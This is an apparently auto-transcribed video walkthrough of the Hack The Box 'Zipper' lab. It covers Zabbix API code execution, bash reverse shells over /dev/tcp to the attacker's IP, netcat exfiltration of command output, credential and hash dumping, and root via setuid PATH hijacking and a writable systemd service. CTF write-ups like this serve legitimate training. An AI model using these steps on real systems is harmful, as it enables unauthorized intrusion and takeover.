 what's going on YouTube the zipsak can be doing zipper from hack the box which I really liked because it wasn't overly complex and it felt like an actual pen test you gain a API only access into a program called zabbix which is an open source monitoring application essentially you just install the zabbix agent all your servers and then configure zabbix to a web interface to poll there's agents for things like system utilization disk space website response times etc so you have a central place to look at all that timing information and see when your environments behaving abnormally so if you see one server has high CPU utilization you can try to fix it before it causes problems for the whole cluster and just be proactive but like all IT applications or application and support IT staff such as Blanc Nagios manage engine etc if you shell one of those you can gain shells in a lot of places and this box really does show it because we gain a shell access to zabbix through having API access and then the agents actually a well the zabbix server to execute code on them so we can gain code execution on the agents also in just lateral movement all day so let's just jump in and check what this box is about as always we're going to start with the end map so - SC for D for scripts SV enumerate versions o a output all formats but in the end map directory and call it zipper and then the IP address which is 10 10 10 108 this can take some time to run so I've already ran it looking at the results we can see just two ports are open we have SSH listening on port 22 and HTTP listing on port 80 since web servers are much more vulnerable than SSH let's just try going over to a web browser and saying what is they're so good at 10 10 10 108 and we just get the default Apache page so I'm just gonna try a few pages manually so let's try like robots.txt slash dev slash admin and we don't get any responses so I'm going to throw it over into go Buster I'm just gonna try all the results we can so go Buster - you HTTP 10 10 10 108 - w-4 word list user share word West derp buster directory list 2.3 medium and I'm going to specify 50 threads while go busto runs I'm going to take a look at these SSH banners to find out what version of Ubuntu we have so I'm just going to copy this google launchpad and then the SSH version and that's OpenSSH 7.6 p1 and we can see this is ubuntu Bionic which I believe is Ubuntu 18.4 so let's go and check that out with HTTP so check this go over to launch pad and just google this one and we're going to see this is doesn't have a listing there go to the next resort down doesn't have a listing there and does this one there we go it's also saying this version of Apache is probably Ubuntu Bionic and if you didn't know that was like Ubuntu 18 we could just Google like Ubuntu codenames and then this page should tell us what they all are so once this loads yep 18 4 is Bionic beaver so let's go check if our go buster has finished hasn't finished yet but it does show us a new page slash zabbix so I'm going to go over to Firefox and we're gonna check out what slash SABIC s-- is we get a login portal and we see the copyright is 2018 and it looks like it's a commercial company so I'm just going to Google zabbix default credentials and we're gonna see that username admin password is zabbix so let's just try that and try admin zabbix and we don't save this and which I will add in with a capital a that I never save there we go so we don't get logged in but this does have a link that says sign in as guest I'm going to click this and we can see the zabbix dashboard and if this point I would probably do research on exactly what zabbix is but I'm relatively familiar with it it's a lot like Nagios or some people call it nag use it's just a server monitoring platform so you have the zabbix dashboard that is the controller it has a bunch of agents running on various servers that run various commands and give you status so that's essentially what zabbix is in a nutshell but at this point if I didn't know what it is are we going to Google or YouTube and trying to figure out exactly what this application does so let's go and click on like latest data I like seeing the details thing if I click show details filter and we can see various things about it so the host zipper has agent ping as a script agent Hurst name and the version of zabbix agent and we can see the values ping says it's up the host name says it zipper and the version says 3.0 point 12 then we have another host called zabbix and this one only has one check its zappers backup script so at this point we have three potential user names zapper zabbix and zipper so I'm just gonna walk out and try various credentials you could try things like Hydra but I generally try like the username as the password and password as well so I just did a sipper zipper password and the reason why I do these before I go to Hydra is just because you may lock it out so we said zipper zapper and zabbix so I'll do zapper and zapper and we get a different error message GUI access is disabled so let's just try zabbix and zabbix and zabbix and password so we have something to go off of it's the username is zapper and the password of zapper just says GUI access is disabled I'm gonna go over and we can kill this go Buster and I'm gonna try search boy zabbix I'm going to look at things so we have version let's see does this tell us what we're running but if we log in as guests we can get the version 3 0 to 1 so looking at this we can ignore any like zabbix ones because that's way too old we have this SQL injection it says 3.0 dot X so I'm going to check what X is so we do search point - X and we can view the script we see it was fixed in 3 0 4 and we're like 3 0 21 so this SQL injections not going to be good and the other thing we have is this API JSON RPC remote code execution it says 3 0 3 but let's just try this out anyways and see what's going on so copy this search point - X put the script in and let's see we have to edit the IP address the route we got logins so this is doing admin zabbix the default this host ID thing and this host ID if we go back and log in as guest and go to like latest data we can click on the host do scripts and ping and then this will tell us the host ID right here so zipper is host ID 101 0 6 and zabbix is going to be let's see host ID 100 105 so we can see if we can run other scripts real quick so let's copy this and just paste this in let's see so let's try script ID - we can see that's doing a trace rail script ID 3 we have no Commission's or it doesn't exist 4 doesn't exist 5 doesn't exist so it looks like the only scripts we have a ping and traceroute so I don't know what this backup script is just as item ID and we get access denied but the key thing is to note the actual tidy so 100-105 so then we scroll down we can see let's see it looks like this is probably and do some type of authentication because the variable is called off and then we're doing update and the method is script that update script ID is set to 1 and we're putting a command here so what this is doing is going in and going for script ID 1 and changing the command that is ran so the command here is ping and we'll be changing it to the variable CMD which is I'm guessing what we set so if you're doing this in production this is where you got to think oh maybe I shouldn't use this script maybe I should create a new script to create a script in zabbix and then change that one because right now will be changing production data if we change the ping script who knows how many things are gonna break so just be cautious about things like that and then right after we update it we change it to execute so we're saying script execute script ID 1 and then on the host ID so let us do search boy - m2 mirror the script and now let's edit the script so the first thing we have to change is this zabbix route it's not going to be 192 168 this IP is 10 10 10 108 and we also have to specify the directory zabbix then we have the login it's not gonna be admin it's gonna be zapper and it's not gonna be zabbix it's gonna be zapper yet again now the host ID there's gonna be 100 105 and we got that just based upon this URL saying the host ID right here whoops if we click here click on paying and we get a host ID right here so we do a host ID is that and I think that's all we're going to have to do whoops so let's save this out and at the end of the video we'll go and create our own API script so you can see exactly how this works and get a better understanding but for now let's just test this works so we do Python 3 9 9 3 7 and let's just try hostname and we just get a bunch of weird stuff that's odd let's do if config and we see the IP is not the one we expected we expected to see 10 10 10 108 we got 172 1702 so we're in some type of container so the next thing I did was exit the script go back and edit it and let's try a different host ID so we do host ID 101 Oh 6 try to edit this do let's do host name and we get the same exact thing so no difference between host ID that just didn't do anything and if we actually Google the zabbix API so zabbix API let's do documentation 300 because that's what we are on go-to method reference and if we look at script or a script here and look at the script object we can see there is a execute on flag and if it's 0 it runs on the zabbix agent if it's 1 it runs on the zabbix server so we want to update a script to make this run on the zabbix agent and additionally just so we can see that we are changing things if I click this and do ping we got the output of the last command I ran so this is why you generally don't do this in production just because it does change things so let us edit our script and let's put a execute on so let's change this execute on and then zero runs it on the zabbix agent so we run this again do hostname and now we are on zipper but this was kind of a unintended thing so we'll back out of this and undo that change I just wanted to show that and we'll show going through it intended way so we're back on let's change execute on to be one now Hearst name there we go if you're wondering why something like that exists it's because the web server itself that runs zabbix the monitoring application you generally don't install the agent on itself instead you just say hey web server go execute it under your context and that's why that happens and they have those type of flags so if the server wants to monitor itself it can and additionally you don't always want to tell a agent to run something let's say I just wanted to check the like HTTP response time or something I don't want that to run on the zabbix agent I want that to run their like zabbix web server because I want to simulate a remote connection instead of going at all through localhost so that's kind of why that flag exists but anyways we are on the zabbix server and we are running as Who am I the zabbix user so if we can't at sea passwd to look at other users we don't see any we go into home there is LS slash home let's just get a persistent shell so let's do netcat ll v NP 9001 because it's got to be over 9000 one doesn't have to be just fun and then we'll do bash see and the reason why I do that is because we'll probably in s HR - so if we just echo one to dev TCP 10 10 10 10 10 14 3 I think that's my IP 9001 we get that directory doesn't exist if we do it within bash we will get it so 10 10 14 3 9001 and we get the connection so that's why I always preface this with bash where I'm in these weird reverse shells that are probably not using the bash shell bass Jessie - - I directed and Dev TCP ten ten fourteen three nine thousand one zero and one like that then netcat again let's see and we have a shell so let us make this a better show with Python Python C import PT y PT y dot spawn been - files not found Python 3 is not found so let us use script so we do script - Q and before I do this I'm hitting up down and we can see it's sending the control characters so that's why I'm gonna eliminate and actually get that functionality back so script - Q for quiet the output file is going to be Devon all and now if I do ctrl Z - background it s TTY raw - echo FG enter we can see oh it's I must have forgot to do something because normally that works so it's exit stty raw - echo yeah I'm not sure why that didn't work so let's exit everything and redo this so sty nope reset netcat run this create the show okay so let us find the credentials for my sequel so to find the credentials for the sequel server because zabbix is using SQL I'm just going to Google zabbix change SQL password and this will call up where the config is so how to change the zabbix database password we can see it is in Etsy zabbix is a text over comm so we can just cap this file and then look for password and we can see the DB password is this and we have the DB user as zabbix and the DB name a zabbix DB so I'm just gonna create a thing for notes zabbix this zabbix DB just so I have that somewhere and we'll leave that open so let us try su wing with root and we see su must be ran from the terminal so that's where my script - cue came from and now I can do su and it thinks it's a terminal so we can just paste that password and we see authentication failure so that's not the password there we could also do like my sequel des yeux zabbix - capital D zabbix DB - P and under the password then we can do like show databases use zabbix well zabbix DB show tables describe users and we can select user ID l es passwd from users and dump all the passwords and this looks like maybe sha-1 some let's see how many characters this is echo - n WC - c 32 so that's just a md5 sum so we could try cracking that but let us just cap the notes and let's put do the md5 sum of this so echo - n md5 sum and we can see it's a match so we know the admin users password is the same as the sequel database we knew it zappers was guest this is probably like a blank md5 hash or something let's do echo - n-nothing md5 sum yeah that's a blank md5 sum but we wanted to we could login to the web interface as admin and now we're a super user on zabbix we could go to like configuration or administration and users and see both zapper and zabbix or super admins and this one zappers just in the group that says no access to front-end so if we check configuration and go over to hosts we can see that the zabbix server is enabled and it doesn't have the zabbix agent on it and these are different ways to identify for host is online you got the zabbix agent SNMP JMX this is like the java management console and IPMI this would be for like ILO's and out-of-band management things but on zipper we can see that zbx the zabbix agent is installed so when as Google zabbix agent port and we can see it listens on 150 or 151 so let's see if any of those ports are open from within the zabbix server so if we do NC - ZV let's do up - a maybe I needed a and I sure don't and didn't not do dns let's control C Python 3 9 and C's ok n we can see 172 1701 so we have a different IP we can try doing NC - zv 172 1701 on port 150 and NC is not coming back so let's try - see echo1 dev tcp 172 1701 150 and then if that's successful echo open else echo false and we can see that port is open and we didn't report that did not exist let's say port elite we see false it doesn't it's not open so we could do like 151 and we get false that one's not open so the zabbix agent on 172 1701 is listening on port 150 and again the big clue I saw was just looking at the availability and seeing zbx so let us Google the zabbix agent API so let's Google zabbix agent API c 3.0 maybe this will be it not sure a good way to get to this documentation I want unfortunately hacking around applications is just really a lot of reading so let's see let's do zabbix agent system run which is a command I know in it and there's the page we want so we want to go three Oh manual config items and types zabbix agent so zabbix is very simple in how it works so let's see we got all these different commands so let's see what is one we got agent hostname so if I do echo agent dot hostname and send that to port 150 so once NT - 1701 150 let's see what happens we don't have to do this bash - see thing let's just clean that up we got nothing well it said ZB XD which means it ran but it didn't give us the thing I wanted trans actually a host name from a configuration file you can try agent dot pain so agent dot thing weird paying does it have to have this there we go I think I have to have those brackets first name nope I swear I had this working before let's see are the other ones that we can do net DNS mad if net UDP proc ma'am proc Nam boot time let's try system dot boot time is this gonna send us anything so I say system dot boot time is it to tease it is we just get hand I'm going to go into a show again and we're going to see if that does it so NCO vnp 9001 bashed se bash - I have to see P 10 10 14 3 9000 1 0 & 1 that should be good and now let's try this again see if this gives us a different response if it's not in that weird thing yeah it does so it's this weird shell that was throwing us off we can see that ZB XD and then it says zipper which is the hostname so if we do echo agent ping we can see one so that's host is alive we can try system boot time see what this returns unsupported item key so system dot boot time let's get rid of the brackets and C 1 sin T 2 1701 150 unsupported item so that one doesn't support boot time but if we go all the way down there is a system dot run and if the agent configuration file has enable wrote commands equals 1 then this will run so let's try that so let´s do echo system dot run and then it says put the command and brackets so we'll do paying - c1 I think that's count okay I think Windows and Linux are different there and one is N 1 is C so Linux is - C so 10 10 14 3 and then pipes a 2 and C 172 1701 150 and I forgot to close off this quote so try this I will do TCP dump - I con zero ICMP header and we can see the pings going across so we confirmed we have code execution we can do NAT cat - H and I want to look for the keep open which is - K so let's do netcat LV let's do just L K and P 9001 and then let's try a different thing so let's try echo system run LS / NC 10 10 14 3 9001 and then close off the quote pipe that to and see once into 1701 150 so what we're doing is telling the system to run LS / and send the results to 10 10 14 3 on point 9001 and then sending that to 1/7 to 1701 put 150 and we can see we have the output of that command so we could also just do the same thing except do Who am I to the same exact thing and we can see where zabbix I sure did hostname to show it says zipper so let's just do that real quick first name and base this and we can see the host name is zipper but enough of doing all this let's get a shell so let´s do echo system run so let's see do this then bash - see what is it bash - I that dev TCP 10 10 14 3 9001 0 direct to 1 and that and that and then NC 1 say - 1701 with the port and that looks good and there we go we got a shell on the box and then the shell dies when this dies so that show only lasts a few seconds and the reason for that is we have the agent that is running this command and by default it only listens for waits like 3 seconds and says ok you were running longer than 30 seconds I'm dying and we're going to kill you so we have to flick the process out of the agent to do that I'm gonna use a command called no huh so let's do the same thing oh we lost a whole shell that's unfortunate let's just do Python this and let's do system run copy this so do no help then paste the shell and then put a and at the end and then we can just do it as normal and that no hub is going to background a process so now if the agent died we still have the shell so now we're on the zabbix host and we can clear let's echo export term is equal to 2x term that work and that we can clear so the first step to do on this box would be probably linen oom so let's start a web server in this session so let's go opt linen oom Python M simple an HTP server and then we just curl 10 10 14 3 port 8000 when a new message type that over to bash and curl is not installed do we have and see on this one we do so I'm just gonna do net cat Lynn a new net cat LVN P 8000 and direct wit a noon there we can do netcat 10 10 14 3 port 8000 pipe that over to bash and there we go now we have led a new running this shouldn't take too long and then we can just go of all the output and see where we want to begin with trying to do a pre vasc the key thing I want to know is exactly kind of like what container technology is this is this running Linux containers is it running docker qmu what is that one semi 217 address actually running so let's just go and start looking at this well it runs so we have the general information that's Ubuntu that's not a big shock see Ubuntu 1804 so we are correct there hostname zipper we have root previously logging into the system users zabbix we don't really have any cool users we have some admin users zapper as an admin and we are the user zabbix so there is a different user Etsy passwd super user accounts home directories we have zapper and anyone can go into zappa's directory so we should take a look at that zabbix agent hidden files word readable files in home we have homes app or utils backup dot SH so this is probably that backup script we saw in the zabbix web interface shells nothing interesting Cron's nothing too interesting we have system D timers purge - backups timer we have networking IP docker is listening on 172 1701 so it answered that question and let's see let's just go and look at exactly what that scan was not scan utils directory so if we kill the net cat on my host yes I get my shell back awesome so let's go home zapper and then let's go into that utils directory and let's look at backup dot Sh and we can see it's creating a zip file of the you tolls directory with the password of zippity-doo-dah so let's just try su to zapper with that password must be in a terminal so let's see do we have Python let's just do which Python you do which Python 3 and we can also do the script dash Q thing like we did last time I just like doing the Python better so import PQ y PT y that spawn been bash and now we can do su zapper paste the zippity-doo-dah and we're now the zapper user and we can do a WC - you on user dot txt and RW C - C and C it's 30 30 characters which is an md5 sum in a line break so we can get that hash if we wanted and get credit but going back in the utility we have a set UID binary and first I'm going to do the unintended way and then we'll do it the intended way you don't attend a way we could have done it as the zipper user we didn't need to get zapper because if we do strings on zabbix - service we can see whoops let's see it's gonna do start/stop we got a question here and we got systemctl daemon reload systemctl stores ethics agent so this is the key thing to pay attention to this is passing a command somewhere so let's just try running this actually before we run that one of the key things to do is go into the SSH directory and grab this private key because as we're going to see I'll go to utils and then if we run this zabbix service and we say stop it's going to kill or a shell and the downside when it kills a shell is we don't have an easy way to get one so if we do this Python let's go back what was it let's do echo let's pause it system duck run we can paste this in we want to listen on 9001 but we get connection refused on that zabbix port so if we didn't grab the key stopping the agent just kill it away to prove ask up the stream so let's go back up and grab this SSH key so let's copy this then do the Zappa Pam paste it chmod 687 Pam zapper at 10 10 10 108 and we're back in so stopping it can be very bad so if we do all trace on this service to see exactly what it does that wasn't the right file l trace on the zabbix service it's asking us to start a stop let's do start and we can see it's doing a system command into systemctl and the thing about set UID binaries is they don't have a safe path so if there was sudo you could have it so you can't do path hijacking or whatever that's called so since it's just calling systemctl it's defaulting to the path and going to look at all these directories for systemctl one by one so what we can do is let's make a directory we already have temp created so let's just do temp system CTL and put then bash and bash and then chmod plus x temp systemctl and if I do systemctl here it's just going to run systemctl if i export path is equal to i do equals here I think path is equal to temp I don't think so actually yeah I don't do equals export path tap path I'm drawing such a mind foot right now let´s do echo path it's just path is equal to tap path I'd go path export path systemctl there we go we can see we have changed a path so when I did systemctl before my path had slash temp at the beginning it ran system CTL from wherever it existed when I put temp at the beginning and now rien systemctl which was my bash script so if I do dot slash zabbix service stop we now instead of running that systemctl to stop the service it runs a bash script and we are route so I can go in the route and then we can do WC CD / root and then WC - C root text and we can read that the intended way would be looking at that purge service so in that linen oom if I still have in my history when the new purge these purge backup timers so if we look at this so if we do find slash Etsy grep purge backups and look at exactly what the services and do an LS - away on it we can see that the Zappa user can write the service so we can edit this and we can change exact to be anything we wanted so we could just comment this out and say exact start is equal to temp please it subscribe dot SH and then if we create the tap please subscribe sh we can like copy root root txt one will actually just do chmod four seven five five on VI and he hasn't been VI which VI user been tap please subscribe user been VI so now if we figure a way to run that purge backup service maybe just wait a bunch of time or every time you do the starting and stopping the service we do zabbix service and let's say start we can do journal CTL - F and see a bit of the log let's do that exert Asst stop it journal CTL I could have sworn that would have showed it journal CTL maybe it's not but anyways if we look at VI now so LS dash away user bin VI it did not work and that may be because it's symlink - Etsy alternatives VI I watched a chalet been - does that exist it does so let's do the tap please subscribe god SH just do this to bend - and then let's - away then - not there if we stop the service Oh general CTL is not working because of my path gosh darn it I think echo path yeah so path is equal to let's do this exploit path and then dot slash zabbix service stop there we go Journal CTO - f I don't know why it's not writing anything to system D I want to say if you do Journal CTL - f you will see it or maybe I just have the command wrong but anyways OS - I way then - still not there zabbix service start zabbix service stop something has screwed up the system time on that I think so this may be one you just have to try on your own and see if you get it working I want to say something has screwed me over or try one last thing so copy this to make sure I'm have typos I do not but we don't have been - and let's chmod plus x to make that executable and then let's try this again stop stir it now let's - la Bend - there we go now it's got the set UID bit so it's because it wasn't executable with it didn't have that bash Hedren but now when I execute - it switches me over - oh it looks like this version of - drop set UID bits so you'll to find a program that doesn't drop your set UID bit for it to work sometimes - does sometimes - doesn't I guess on Ubuntu Bionic - is dropping that but we have confirmed we did execute code so if we wanted to we could just let's do edit this we could chmod 777 slash root and then chmod 777 root root dot txt and then run the zabbix thing stop skirt and then if we do LS dash away on slash we can see root and chmod at 777 so we can go in and we can also grab root text so that is the intended way to do it so let's go and step back way far back and look at creating our own API script because being able to read an API and then create a client is pretty awesome so let's close out of everything and close out of this and now we are back at root so let's begin and let's start creating our skeleton script which will turn into API client so the first thing we want to do is do from CMD import CMD P equals I'm going to create a sudo terminal so when we do that we create the class terminal CMD we want the prompt to be just a simple caret then we need a function so we'll call this do subscribe and then we can do print thank you for subscribing and then we just got to create our object and start it so terminal is equal to terminal and then terminal dot CMD loop so if I do Python 3 on zabbix type subscribe it says thank you for subscribing so now we have to make this actually login to the API so we do def do login self uggs and I'm going to split my terminal and let's see exactly how this script does it so we have a payload and it does JSON RPC user login off none zero and I really hate writing this payload every time so I'm going to create a function called death API call and we do self hugs and that's just going to simplify it so we can always just call this one and then we don't have to specify all of this every time so this API call URL is equal to HTTP 10 10 10 108 zabbix API JSON RPC dot PHP then the header we want content tight and there's going to be application JSON okay then we want the payload is equal to we want JSON RPC 2.0 method this is gonna just be a argument then params script ID oh that's not login you want up here okay so for params let's just do Graham's because this can be anything and then both will do the off variable ID is equal to ID okay and instead of self eggs let's give all these variables names so we want to do self the first one is method then we have grams then we have auth then we have ID I just went down the list here okay so now we can do response is equal to and we have to do import requests box is equal to request dot post URL data is equal to JSON dumps payload headers is equal to header okay and then we want to return and they're just doing all that JSON here but since we're in a function I'm returning it like this okay so now we can do our login so we can do user password is equal to X dot split and then we got to create the params variable so user equal to user password is equal to password okay then we can just do API call and then user dot login that is the method then params none zero and we're just going to call this off and we can print off so I'm going to print what this is I think that's going to work so we can do login zapper zapper API underscore call is not defined let's do self dot API call login zapper zapper JSON is not defined we got to input JSON login zapper zapper and I probably type out the URL since it's taking so long so 10 10 10 108 I did not log in zapper zapper I have to have a return wall game zapper zapper see is this not working I think my VPN went down let's try reconnecting complete okay let's do this again well again Zappa Zappa there we go so for some reason my VPN was down and that's why it was timing out so we do have the author result right here so let's do print off and then was it result try this well again zapper zapper and there we go so we want to do is just return this instead of printing it and we're going to create a initialization for this so I'm going to do death a knit because we don't have to log in every time so do that then we can do self dot off is equal to self dot log n self dot do log in zapper zapper and then do subscribe we're going to print self dot off so try this terminal object has no key so we just have to call the an it so CMD an it self there we go and if we type subscribe we get the auth cookie so we can control see this again do you subscribe and we get a new cookie so now a script is automatically logging in so let's go and google the zap API so we don't need this anymore all we're doing now is straight googling so let's do zabbix API documentation 3.0 and the first thing we want to do is let's just list all the users so let's go to method reference go to user and we can look at what we can do with users so we got the user object and we get all these functions user get so let's check this one out so this will be the method is use get and then all these are parameters so to get access is adds the following properties for each user and this is a flag so this can be just be 0 1 I guess so let's try this and is there any other one we want to do editable sort field No so let's go back in a script and 2 3 4 5 6 7 8 let's do 8 yank put and instead of do login we're going to do do get users and we don't need any arguments so the parameters all we want to do is let's try doing with no parameters so get prams and this but we have none that is off and I think we put a 1 here I forget what that last one is but let's just try this print let's do users and then we can print users to be good get users off not defined is that a self dot off I always forget that in classes get users invalid params the user duck login method must be called without the off parameter I forgot to edit this this is user get is the method so instead of users off well again users get get users and now we finally start getting it so we got admin user ID to guest this isn't really that pretty so let's make this pretty so I think it's import pretty print as PP and then we can do PP dot P print users and let's try this get users and there we go so now we got let's count how many lines this is so copy the temp WC - L for lines we got 15 lines and the thing we wanted to do was the get access flag so let's exit this and let's do params get access one so now when we do this get users this looks like more things the temp pace this in CC - shell temp we got 18 so we got three new lines from the last one and it should have just done something so I could diplom and we could see what we get so let's go back up here copy this the temp - and then diff temp temp - OH spacing and stuff makes it annoying scat temp cat 10 - whoa grab dot temp - said let's get rid of all spaces actually it looks nice let's do that - temp 1 - okay diff temp temp - so we can see debug mode GUI access and maybe user status is different so what if we cat temp - cat temp temp should be really obvious so alias zapper attempt so yeah user status and then debug mode and GUI mode is different so that's what that one thing did let's do something to get the groups so let's do def do get groups self eggs and then let's yank one two three four five lines based get rid of the prams let's get rid of this and let's go to groups so user group and let's do user group get so the very first thing so I don't forget let's do user group get as the method name and let's try calling without any parameters and see what happens get groups and we can see we have zabbix administrators gasps disabled an able debug mode and no access to the front end so let's see what we could do let's see limit selects so anything cool we could do with this so we could say status so return only groups with a given status and we refer to this page for what statuses user status zero is enabled one is disabled so if we want it to only get the groups that were enabled we can just pass that as a flag so zero was enabled so if we get groups that disabled isn't there so if we do this again change status to one and we do get groups but you only get that disabled group so let's do create a user so let's go into users and we can do user create and we want to do let's see params alias passwd user groups if we do the user object whoops user object will probably see all the things we can do and we want to do give a user the type as a super admin so we want to make a call to user dot create so let's just yank this I think that seven lines yank paste sweet so we're actually going to use args so nerds will be user password is equal to X dot split and then params we needed alias that's required so alias is going to be upset then we need the name it's going to be if sec passwd it uses pass that we do right user ID let's do user create passwd is required so passwd is going to be please subscribe oh shoot alias user password password and name will be the same as the user i forgot i created these as variables okay we want to do type is three will leave type out of it and then do type next so the next thing we wanted to do was user groups and we want to do the admin so user group goes bracket than JSON so us our GOP s like this I think then us our GOP ID has an annoying way to say it and we'll say seven and that's probably it we need to specify user create and let's just do some housecleaning I don't put don't put I don't put okay I don't know if that's actually going to work and we don't want to do get users we're going to do create user and Python three create user Itzhak please subscribe looks like it created it and returned hips ik is user ID for so if we go back to zabbix let's do new private window 10 10 10 108 zabbix EPSA please subscribe if sec please subscribe and we get pretty much no information we know what the admin portal looks like and we are definitely in the admin group if we go here do administration user groups zabbix administrators we can see if SEC is a administrator but if we go to his permissions he's denied everything if we go list all the users and we see it Zach yes is a zabbix administrator but he's still a user type of zabbix user so if I wanted to we had could either just create a new user where we can change a user so let's look at how to change a user real quick let's do seven let's try changing user so make admin params this will be user ID probably I don't make it easy if we just do this put that there put this here there we go so now go here let's do user update so user ID and then we can specify what we want so make admin user ID is equal to eggs would do type I think was just type is this the user user object type three so Type three user dot update and it doesn't say we have to do user ID so maybe we can do alias and maybe we'll update this way so run this make admin tip SEC wrong fields for user if SEC let's try user ID make admin 4 and success so let's see if we refresh this we can just log in again hips AK please subscribe and now we can see we are definitely a super administrator so if you want to go further on I leave it up to you to add some stuff to the script maybe you should take that script update script executes and have this actually go in the API and go into a script and do script create to create a new script get the idea that script and then execute it so that way when you're doing zabbix API stuff you're not overwriting whatever script ID 1 equals additionally something you may want to do is make this make admin thing make this do a get user and search for the user if SEC pull the user ID and then do this params and put it here so in the make admin you can specify user names instead of having to specify the user ID because it would be getting the user ID from the get users request if that makes sense you just do essentially get users find ipsec get his ID and then do a make admin and past the ID there yeah so to show exactly how that one script works let's see if we can find it or how the code execution thing works administation scripts we can look at ping and we can see everything here so we can see the type is a script executes on zabbix agent here's the command this is the last command we ran because we over wrote the ping and then there should be Oh execute on zabbix agent or zabbix server so that's why we're that one flag comes and why we could just change to zabbix agent and have this execute on the zipper host user group missions what not so yeah that'll be the video hope you guys enjoyed it take care and I will see you all next week